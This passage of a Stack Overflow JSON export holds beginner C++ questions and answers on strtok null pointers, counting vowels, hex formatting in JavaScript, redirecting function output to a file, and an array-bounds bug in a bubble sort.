"link": "https://stackoverflow.com/users/1342730/mathematician1975"}, "edited": false, "score": 3, "creation_date": 1429743990, "post_id": 29810493, "comment_id": 47748999, "body": "Why not just check for NULL pointer returned by <code>strtok</code> before calling <code>strlen</code> with it? <code>strtok</code> returns NULL when the end of string is reached as far as I recall so you should be checking anyway"}, {"owner": {"reputation": 43, "user_id": 4282249, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f48592e60c8cafdfb79f2d1e1d166668?s=128&d=identicon&r=PG&f=1", "display_name": "laurentiupiciu", "link": "https://stackoverflow.com/users/4282249/laurentiupiciu"}, "reply_to_user": {"reputation": 20231, "user_id": 1342730, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/36543a7316596ec6e930bc8c996bf14b?s=128&d=identicon&r=PG", "display_name": "mathematician1975", "link": "https://stackoverflow.com/users/1342730/mathematician1975"}, "edited": false, "score": 0, "creation_date": 1429744162, "post_id": 29810493, "comment_id": 47749059, "body": "Yes, it is null terminated."}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1429745794, "post_id": 29810493, "comment_id": 47749653, "body": "And <code>New_string</code> is.......?"}], "answers": [{"tags": [], "owner": {"reputation": 20231, "user_id": 1342730, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/36543a7316596ec6e930bc8c996bf14b?s=128&d=identicon&r=PG", "display_name": "mathematician1975", "link": "https://stackoverflow.com/users/1342730/mathematician1975"}, "is_accepted": false, "score": 2, "last_activity_date": 1429744898, "last_edit_date": 1429744898, "creation_date": 1429744157, "answer_id": 29810581, "question_id": 29810493, "link": "https://stackoverflow.com/questions/29810493/segmentation-fault-when-i-try-to-separe-a-char-into-tokens/29810581#29810581", "title": "Segmentation fault when I try to separe a char* into tokens", "body": "<p>You are checking that <code>p</code> is not null in your <code>while</code> conditional, but you reset it with the return value from <code>strtok</code></p>\n\n<pre><code>while (p) {\n    p = strtok(NULL, \" \");\n    std::cout &lt;&lt; strlen(p);\n}\n</code></pre>\n\n<p>Now there is no guarantee that <code>p</code> is not NULL any longer. You should check again that it is not null before passing it to <code>strlen</code>. When the end of string is reached, <code>strtok</code> will return a null pointer (similarly if no token is found), so the check is necessary.</p>\n"}, {"tags": [], "owner": {"reputation": 715, "user_id": 4817677, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a09791349eb1721b4fd7027ef5b68f3?s=128&d=identicon&r=PG", "display_name": "thetoast", "link": "https://stackoverflow.com/users/4817677/thetoast"}, "is_accepted": false, "score": 2, "last_activity_date": 1429744173, "creation_date": 1429744173, "answer_id": 29810586, "question_id": 29810493, "link": "https://stackoverflow.com/questions/29810493/segmentation-fault-when-i-try-to-separe-a-char-into-tokens/29810586#29810586", "title": "Segmentation fault when I try to separe a char* into tokens", "body": "<p><code>strtok</code> will return <code>NULL</code> when no more tokens are found.  Because of that, I think this is what you want:</p>\n\n<pre><code>char *p;\np = strtok(New_string, \" \");\nwhile (p) {\n    std::cout &lt;&lt; strlen(p);\n    p = strtok(NULL, \" \");\n}\n</code></pre>\n\n<p>Note that the <code>std::cout &lt;&lt;...</code> and <code>strtok</code> have been swapped.</p>\n"}], "owner": {"reputation": 43, "user_id": 4282249, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f48592e60c8cafdfb79f2d1e1d166668?s=128&d=identicon&r=PG&f=1", "display_name": "laurentiupiciu", "link": "https://stackoverflow.com/users/4282249/laurentiupiciu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1429744898, "creation_date": 1429743751, "last_edit_date": 1429743897, "question_id": 29810493, "link": "https://stackoverflow.com/questions/29810493/segmentation-fault-when-i-try-to-separe-a-char-into-tokens", "title": "Segmentation fault when I try to separe a char* into tokens", "body": "<p>I'm working at a homework in C++ and I am not allowen to include <code>&lt;sstream&gt;</code>.<br>\nI'm trying to tokenize a char* like this:</p>\n\n<pre><code>char *p;\np = strtok(New_string, \" \");\nwhile (p) {\n    p = strtok(NULL, \" \");\n    std::cout &lt;&lt; strlen(p);\n}\n</code></pre>\n\n<p>My problem is that <code>std::cout &lt;&lt; strlen(p);</code> causes a SEG FAULT.\nCould somebody offer an alternative to strtok() or a solution for accessing everytime strlen(p)?</p>\n"}, {"tags": ["c++", "arrays"], "comments": [{"owner": {"reputation": 3784, "user_id": 2593738, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/EO83B.png?s=128&g=1", "display_name": "developerbmw", "link": "https://stackoverflow.com/users/2593738/developerbmw"}, "edited": false, "score": 0, "creation_date": 1429748372, "post_id": 29810448, "comment_id": 47750511, "body": "lol @ &quot;you are idiot&quot;"}], "answers": [{"comments": [{"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1429745906, "post_id": 29810636, "comment_id": 47749694, "body": "You didn&#39;t catch that the argument to <code>check</code> is a <code>string[]</code> which is certainly wrong"}, {"owner": {"reputation": 462, "user_id": 3113508, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b8950f1d046593f6cbd9bca76961583f?s=128&d=identicon&r=PG", "display_name": "Scott M", "link": "https://stackoverflow.com/users/3113508/scott-m"}, "reply_to_user": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1429750976, "post_id": 29810636, "comment_id": 47751321, "body": "Thanks! Fixed. Feel free to edit my answer if you find any other errors. This code could definitely still use some cleanup, but it should at least function as desired in its current state."}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1429787806, "post_id": 29810636, "comment_id": 47769711, "body": "Yep it probably should"}], "tags": [], "owner": {"reputation": 462, "user_id": 3113508, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b8950f1d046593f6cbd9bca76961583f?s=128&d=identicon&r=PG", "display_name": "Scott M", "link": "https://stackoverflow.com/users/3113508/scott-m"}, "is_accepted": false, "score": 0, "last_activity_date": 1429750903, "last_edit_date": 1429750903, "creation_date": 1429744486, "answer_id": 29810636, "question_id": 29810448, "link": "https://stackoverflow.com/questions/29810448/c-wrting-a-function-that-returns-the-number-of-occurrences-of-the-characters/29810636#29810636", "title": "C++ Wrting a function that returns the number of occurrences of the characters &#39;a&#39;,&#39;e&#39;, &#39;i&#39; from the string called line_of_input", "body": "<p>Function check() should return an N, but it does not need to be passed in an N. Also, it is working on one string, not an array of them:</p>\n\n<pre><code>N check(string line_of_input)\n{\n    N n = {0, 0, 0};\n    for(int i=0;i&lt;line_of_input.size();i++)\n    {\n        if(line_of_input[i]=='a')\n        n.n1++;\n        if(line_of_input[i]=='e')\n        n.n2++;\n        if(line_of_input[i]=='i')\n        n.n3++;\n    }\n    return n;\n}\n</code></pre>\n\n<p>Also, I fixed a bug in your checks. 'i' goes in the square brackets in each case, because it represents your loop iterator variable used in the <code>for</code> loop; the letter you are looking for goes in the single quotes.</p>\n\n<p>Then you can catch the returned N in main:</p>\n\n<pre><code>int main()\n{\n    string line_of_input=\"you are idiot\";\n    N n = check(line_of_input);\n    cout&lt;&lt;n.n1&lt;&lt;endl;\n    cout&lt;&lt;n.n2&lt;&lt;endl;\n    cout&lt;&lt;n.n3&lt;&lt;endl;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 2245235, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72a03c550aeb92d604d25e2d5959ce6?s=128&d=identicon&r=PG", "display_name": "Jason Jun Peng Luo", "link": "https://stackoverflow.com/users/2245235/jason-jun-peng-luo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 76, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1429750903, "creation_date": 1429743494, "last_edit_date": 1429743782, "question_id": 29810448, "link": "https://stackoverflow.com/questions/29810448/c-wrting-a-function-that-returns-the-number-of-occurrences-of-the-characters", "title": "C++ Wrting a function that returns the number of occurrences of the characters &#39;a&#39;,&#39;e&#39;, &#39;i&#39; from the string called line_of_input", "body": "<p>I am trying to make a program that uses a function to count the occurrence of \"a\", \"e\", \"i\" vowels within a string by using an array.</p>\n\n<p>This is the code I have come up so far. I have no idea where to place the function in their proper order. Please give me some guidance. I think the declaration of <code>n</code> is wrong.</p>\n\n<pre><code>#include&lt;iostream&gt;\n#include&lt;cstring&gt;\n#include&lt;string&gt;\n\nusing namespace std;\n\nstruct N{\n    int n1;\n    int n2;\n    int n3;\n};\nN check(string line_of_input[],N n);\n// \n\nint main()\n{\n    int n={n,n,n};\n    string line_of_input=\"you are idiot\";\n    check(line_of_input,n);\n    cout&lt;&lt;n.n1&lt;&lt;endl;\n    cout&lt;&lt;n.n2&lt;&lt;endl;\n    cout&lt;&lt;n.n3&lt;&lt;endl;\n}\n\nData count_aei(string sentence)\n{\n    Data count =0;\n\n    for(int i=0,i&lt;sentencesize(),i++)\n    {\n        if(sentence[i]=='a') count.na++;\n        if(sentence[i]=='e') count.ne++;\n        if(sentence[i]=='u') count.nu++;\n    }\n    return count;\n}\n\nN check(string line_of_input[],N n)\n{\n    for(int i=0;i&lt;line_of_input.size();i++)\n    {\n        if(line_of_input[i]=='a')\n        n.n1++;\n        if(line_of_input[e]=='a')\n        n.n2++;\n        if(line_of_input[o]=='a')\n        n.n3++;\n    }\n    return n;\n}\n</code></pre>\n"}, {"tags": ["javascript", "c++", "c", "printf"], "comments": [{"owner": {"reputation": 574451, "user_id": 816620, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/Xu7hp.jpg?s=128&g=1", "display_name": "jfriend00", "link": "https://stackoverflow.com/users/816620/jfriend00"}, "edited": false, "score": 0, "creation_date": 1429743432, "post_id": 29810359, "comment_id": 47748803, "body": "There is no <code>swprintf()</code> in Javascript."}], "answers": [{"comments": [{"owner": {"reputation": 30076, "user_id": 1828637, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/46b5428a878306d5af0a87fc7b2db499?s=128&d=identicon&r=PG", "display_name": "Noitidart", "link": "https://stackoverflow.com/users/1828637/noitidart"}, "edited": false, "score": 0, "creation_date": 1429744295, "post_id": 29810483, "comment_id": 47749115, "body": "I&#39;m trying to replicate its behavior here: <a href=\"http://mxr.mozilla.org/mozilla-central/source/other-licenses/nsis/Contrib/CityHash/CityHash.cpp#78\" rel=\"nofollow noreferrer\">mxr.mozilla.org/mozilla-central/source/other-licenses/nsis/&hellip;</a>"}, {"owner": {"reputation": 18435, "user_id": 845568, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c4f2f13bd99d95ae2ee2249e9b1b8731?s=128&d=identicon&r=PG", "display_name": "Captain Obvlious", "link": "https://stackoverflow.com/users/845568/captain-obvlious"}, "reply_to_user": {"reputation": 30076, "user_id": 1828637, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/46b5428a878306d5af0a87fc7b2db499?s=128&d=identicon&r=PG", "display_name": "Noitidart", "link": "https://stackoverflow.com/users/1828637/noitidart"}, "edited": false, "score": 1, "creation_date": 1429756688, "post_id": 29810483, "comment_id": 47753061, "body": "@Noitidart This answers your question. You just take the resulting hash value generated in <code>CityHash64</code> and use <code>toString</code> to convert it to hexadecimal text string -  <code>hashString = hashValue.toString(16);</code>."}, {"owner": {"reputation": 30076, "user_id": 1828637, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/46b5428a878306d5af0a87fc7b2db499?s=128&d=identicon&r=PG", "display_name": "Noitidart", "link": "https://stackoverflow.com/users/1828637/noitidart"}, "reply_to_user": {"reputation": 18435, "user_id": 845568, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c4f2f13bd99d95ae2ee2249e9b1b8731?s=128&d=identicon&r=PG", "display_name": "Captain Obvlious", "link": "https://stackoverflow.com/users/845568/captain-obvlious"}, "edited": false, "score": 0, "creation_date": 1429768748, "post_id": 29810483, "comment_id": 47757105, "body": "Thanks @CaptainObvlious Ill try that ou! :)"}], "tags": [], "owner": {"reputation": 715, "user_id": 4817677, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a09791349eb1721b4fd7027ef5b68f3?s=128&d=identicon&r=PG", "display_name": "thetoast", "link": "https://stackoverflow.com/users/4817677/thetoast"}, "is_accepted": true, "score": 2, "last_activity_date": 1429743679, "creation_date": 1429743679, "answer_id": 29810483, "question_id": 29810359, "link": "https://stackoverflow.com/questions/29810359/from-javascript-swprintf/29810483#29810483", "title": "From JavaScript - swprintf", "body": "<p>JavaScript numbers have a <code>toString</code> method which takes a radix.  Using <code>toString(16)</code> will get you the number in hex.  Is this what you're looking for?</p>\n"}], "owner": {"reputation": 30076, "user_id": 1828637, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/46b5428a878306d5af0a87fc7b2db499?s=128&d=identicon&r=PG", "display_name": "Noitidart", "link": "https://stackoverflow.com/users/1828637/noitidart"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 29810483, "answer_count": 1, "score": -1, "last_activity_date": 1429743679, "creation_date": 1429743020, "question_id": 29810359, "link": "https://stackoverflow.com/questions/29810359/from-javascript-swprintf", "title": "From JavaScript - swprintf", "body": "<p>I'm trying to do this <code>swprintf(hexResult, L\"%I64X\", result);</code> from javascript, is this possible? Such that <code>CityHash64('C:\\Program Files (x86)\\Mozilla Firefox')</code> is encoded as <code>E7CF176E110C211B</code>.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c++", "file-io"], "comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1429743472, "post_id": 29810267, "comment_id": 47748815, "body": "(OT) the function should pass a,b,c either by value or by const reference, since it does not modify them"}, {"owner": {"reputation": 18935, "user_id": 19405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a72b55a41a43ea0493fc64641a1ed295?s=128&d=identicon&r=PG", "display_name": "nobody", "link": "https://stackoverflow.com/users/19405/nobody"}, "edited": false, "score": 0, "creation_date": 1429744708, "post_id": 29810267, "comment_id": 47749255, "body": "@Christian Your suggested edit is inappropriate. Do not add code to questions."}], "answers": [{"comments": [{"owner": {"reputation": 1329, "user_id": 4036303, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/S6Pwi.png?s=128&g=1", "display_name": "Ghostff", "link": "https://stackoverflow.com/users/4036303/ghostff"}, "edited": false, "score": 0, "creation_date": 1429744246, "post_id": 29810350, "comment_id": 47749094, "body": "is there any header i have to include? the cout got underlined."}, {"owner": {"reputation": 30275, "user_id": 4272464, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4fa45261dec56004145c653832504920?s=128&d=identicon&r=PG&f=1", "display_name": "bgoldst", "link": "https://stackoverflow.com/users/4272464/bgoldst"}, "reply_to_user": {"reputation": 1329, "user_id": 4036303, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/S6Pwi.png?s=128&g=1", "display_name": "Ghostff", "link": "https://stackoverflow.com/users/4036303/ghostff"}, "edited": false, "score": 1, "creation_date": 1429744339, "post_id": 29810350, "comment_id": 47749130, "body": "You have to <code>#include &lt;iostream&gt;</code>, and if you want to use names defined under the <code>std</code> namespace (such as <code>cout</code>) without qualification, then you have to specify <code>using namespace std;</code>. Alternatively you can qualify them, for example <code>std::cout</code>."}], "tags": [], "owner": {"reputation": 30275, "user_id": 4272464, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4fa45261dec56004145c653832504920?s=128&d=identicon&r=PG&f=1", "display_name": "bgoldst", "link": "https://stackoverflow.com/users/4272464/bgoldst"}, "is_accepted": true, "score": 7, "last_activity_date": 1429743922, "last_edit_date": 1429743922, "creation_date": 1429742979, "answer_id": 29810350, "question_id": 29810267, "link": "https://stackoverflow.com/questions/29810267/writing-void-into-a-file-with-c/29810350#29810350", "title": "Writing void into a file with c++", "body": "<p>The way you've written it, your <code>print()</code> function is not capable of outputting to any given stream. This is because it hard-codes the stream that it writes to as <code>cout</code>.</p>\n\n<p>If you want it to be able to write to any given stream, you have to parameterize the stream as another function parameter. For (1) convenience and (2) compatibility with existing code that assumes <code>print()</code> only takes three arguments and writes to <code>cout</code>, you can make the new parameter optional by defaulting it to <code>cout</code>:</p>\n\n<pre><code>void print(int&amp; a, double&amp; b, string&amp; c, ofstream&amp; os=cout) {\n    os &lt;&lt; setprecision(2) &lt;&lt; fixed;\n    const double GPA = a/b;\n    if (c == \"Y\") {\n        os &lt;&lt; \"\\n\\nTotal number of credit hours: \" &lt;&lt; a &lt;&lt; endl;\n    } else {\n        os &lt;&lt; \"\\n*** Grades are being held for not paying the tuition. ***\";\n    }\n}\n</code></pre>\n\n<p>Then you can call it as follows:</p>\n\n<pre><code>print(a,b,c,file);\n</code></pre>\n\n<p>The reason why your code doesn't compile is that you cannot pass void as a function argument or operator operand. When a function is declared as returning void, that means <em>it does not return anything at all</em>. There is no data returned by <code>print()</code> to stream to the ofstream. The streaming takes place inside the function, so it is only there that you can select the stream to which the output will be written.</p>\n"}, {"tags": [], "owner": {"reputation": 56117, "user_id": 845092, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/50ccdbac5f0f9ff683e4b30a248189bf?s=128&d=identicon&r=PG", "display_name": "Mooing Duck", "link": "https://stackoverflow.com/users/845092/mooing-duck"}, "is_accepted": false, "score": 2, "last_activity_date": 1429743961, "creation_date": 1429743961, "answer_id": 29810543, "question_id": 29810267, "link": "https://stackoverflow.com/questions/29810267/writing-void-into-a-file-with-c/29810543#29810543", "title": "Writing void into a file with c++", "body": "<p>bgoldst's answer solves the problem as asked, but I recommend a completely different solution.  Stick your data in a class that has <code>operator&lt;&lt;</code> overloaded.</p>\n\n<pre><code>struct class_results {\n    int credits;\n    double GP_total;\n    bool tuition_paid;\n};\nstd::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const class_results&amp; c) {\n    if (c.tuition_paid) {\n        const double GPA = c.credits/c.GP_total;\n        out &lt;&lt; \"Total number of credit hours: \";\n        out &lt;&lt; setprecision(2) &lt;&lt; fixed &lt;&lt; c.credits&lt;&lt; '\\n';\n    } else\n       out &lt;&lt; \"\\n*** Grades are being held for not paying the tuition. ***\" \n    return out;\n}\n</code></pre>\n\n<p>Then usage is slightly more normal:</p>\n\n<pre><code>class_results results = {num_credits,GPTottal,tuition};\nofstream file;\nfile.open(\"file.txt\");\nfile &lt;&lt; results;\nfile.close();\ncout &lt;&lt; \"file created\" &lt;&lt; endl;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "is_accepted": false, "score": 1, "last_activity_date": 1429745968, "creation_date": 1429745968, "answer_id": 29810909, "question_id": 29810267, "link": "https://stackoverflow.com/questions/29810267/writing-void-into-a-file-with-c/29810909#29810909", "title": "Writing void into a file with c++", "body": "<blockquote>\n  <p>How can I write the <code>cout</code> in <code>print(int, double, string)</code> into a text file without tampering with <code>print(int, double, string);</code>?</p>\n</blockquote>\n\n<p><strong>You can't.</strong></p>\n\n<p>The function <code>print</code> is broken and you can't do what you want without fixing it.</p>\n"}], "owner": {"reputation": 1329, "user_id": 4036303, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/S6Pwi.png?s=128&g=1", "display_name": "Ghostff", "link": "https://stackoverflow.com/users/4036303/ghostff"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1784, "favorite_count": 0, "accepted_answer_id": 29810350, "answer_count": 3, "score": 0, "last_activity_date": 1429745968, "creation_date": 1429742642, "last_edit_date": 1429743189, "question_id": 29810267, "link": "https://stackoverflow.com/questions/29810267/writing-void-into-a-file-with-c", "title": "Writing void into a file with c++", "body": "<p>i have the following code</p>\n\n<pre><code>void print(int &amp; a, double &amp; b, string &amp; c)\n{\n    cout &lt;&lt; setprecision(2) &lt;&lt; fixed;\n    const double GPA = a/b;\n    if(c == \"Y\")\n    {\n        cout &lt;&lt; \"\\n\\nTotal number of credit hours: \" &lt;&lt; a &lt;&lt; endl;\n    }\n    else\n    {\n       cout &lt;&lt; \"\\n*** Grades are being held for not paying the tuition. ***\" \n    }\n }\n</code></pre>\n\n<p>How can I write the <code>cout</code> in <code>print(int, double, string)</code> into a text file without tampering with <code>print(int, double, string);</code>? I tried something like this </p>\n\n<pre><code>ofstream file;\nfile.open(\"file.txt\");\nfile &lt;&lt; print(a,b,c);\nfile.close();\ncout &lt;&lt; \"file created\" &lt;&lt; endl;\n</code></pre>\n\n<p>but this doesn't compile. Why not, and how do I fix it?</p>\n"}, {"tags": ["c++", "arrays", "dynamic-memory-allocation"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1429742266, "post_id": 29810179, "comment_id": 47748392, "body": "Wouldn&#39;t it make more sense to use <code>std::vector</code>? Seeing magical numbers like <code>10</code> in here is usually a sign something will go horribly wrong if that bound is exceeded."}, {"owner": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1429742383, "post_id": 29810179, "comment_id": 47748440, "body": "Oh my god. I am an idiot. Just replace all the &quot;10&quot;s with &quot;size&quot; and the code will work fine."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1429742553, "post_id": 29810179, "comment_id": 47748507, "body": "This is how you learn, so don&#39;t worry about it. Using C-style arrays is full of trouble like this. That&#39;s why C++ containers are often way, way better. For example, they come with sorting built-in so you don&#39;t have to write your own. That bubble-sort isn&#39;t going to scale beyond trivial amounts of data."}, {"owner": {"reputation": 71857, "user_id": 47453, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/412dc332ab3593c636e5a5202cf98870?s=128&d=identicon&r=PG", "display_name": "Bill Lynch", "link": "https://stackoverflow.com/users/47453/bill-lynch"}, "edited": false, "score": 0, "creation_date": 1429742591, "post_id": 29810179, "comment_id": 47748519, "body": "@Nobody: You missed a <code>10</code> here:    <code>for(i=1;i&lt;10;i++) cout&lt;&lt;arrayy[i]&lt;&lt;&quot;, &quot;;</code>"}, {"owner": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "reply_to_user": {"reputation": 71857, "user_id": 47453, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/412dc332ab3593c636e5a5202cf98870?s=128&d=identicon&r=PG", "display_name": "Bill Lynch", "link": "https://stackoverflow.com/users/47453/bill-lynch"}, "edited": false, "score": 0, "creation_date": 1429743966, "post_id": 29810179, "comment_id": 47748988, "body": "Thank you @BillLynch. Replaced it by <code>size</code> and it works ok now. But I am not totally sure about why it works even though it access values like <code>arrayy[j+1]</code>"}], "answers": [{"comments": [{"owner": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "edited": false, "score": 0, "creation_date": 1429742767, "post_id": 29810229, "comment_id": 47748583, "body": "Yes, but then when it prints the array, one can set it to output only the values that were entered. The code will use more memory than what it is supposed to, but it will work fine. Am I right?"}, {"owner": {"reputation": 56117, "user_id": 845092, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/50ccdbac5f0f9ff683e4b30a248189bf?s=128&d=identicon&r=PG", "display_name": "Mooing Duck", "link": "https://stackoverflow.com/users/845092/mooing-duck"}, "reply_to_user": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "edited": false, "score": 0, "creation_date": 1429743183, "post_id": 29810229, "comment_id": 47748720, "body": "@Nobody: No, since you <code>arrayy[j+1]</code> that writes past the end of your array, corrupting random memory.  Which causes the program to crash at some random <i>completely unrelated point</i> down the road.  Like... when printing a number."}, {"owner": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "edited": false, "score": 0, "creation_date": 1429743534, "post_id": 29810229, "comment_id": 47748833, "body": "And why is it working fine then? If your thought is right, the code was supposed to be written as <code>for(i=0;i&lt;(size-1);i++){ and for(j=0;j&lt;(size-1);j++){</code>, wasn&#39;t it?"}, {"owner": {"reputation": 71857, "user_id": 47453, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/412dc332ab3593c636e5a5202cf98870?s=128&d=identicon&r=PG", "display_name": "Bill Lynch", "link": "https://stackoverflow.com/users/47453/bill-lynch"}, "reply_to_user": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "edited": false, "score": 0, "creation_date": 1429744344, "post_id": 29810229, "comment_id": 47749134, "body": "@Nobody: Undefined behavior causes undefined behavior. One possible outcome of undefined behavior is that it works fine. But it coudl subtly change over different compilers / time of day."}], "tags": [], "owner": {"reputation": 71857, "user_id": 47453, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/412dc332ab3593c636e5a5202cf98870?s=128&d=identicon&r=PG", "display_name": "Bill Lynch", "link": "https://stackoverflow.com/users/47453/bill-lynch"}, "is_accepted": true, "score": 3, "last_activity_date": 1429742478, "creation_date": 1429742478, "answer_id": 29810229, "question_id": 29810179, "link": "https://stackoverflow.com/questions/29810179/variable-size-array-sorter-bugging-with-no-reason/29810229#29810229", "title": "Variable size array sorter bugging with no reason", "body": "<p>Let's assume that <code>size == 4</code>.</p>\n\n<p>You'll eventually set <code>j == 3</code>, and then access <code>arrayy[j]</code> and <code>arrayy[j+1]</code>. Accessing <code>arrayy[j+1]</code> at that moment provokes undefined behavior because it is outside the array.</p>\n"}, {"tags": [], "owner": {"reputation": 195, "user_id": 3054492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/9811e8d89674fea1408c4cb9def570d5?s=128&d=identicon&r=PG&f=1", "display_name": "Matheus Danella", "link": "https://stackoverflow.com/users/3054492/matheus-danella"}, "is_accepted": false, "score": -1, "last_activity_date": 1429742828, "creation_date": 1429742828, "answer_id": 29810316, "question_id": 29810179, "link": "https://stackoverflow.com/questions/29810179/variable-size-array-sorter-bugging-with-no-reason/29810316#29810316", "title": "Variable size array sorter bugging with no reason", "body": 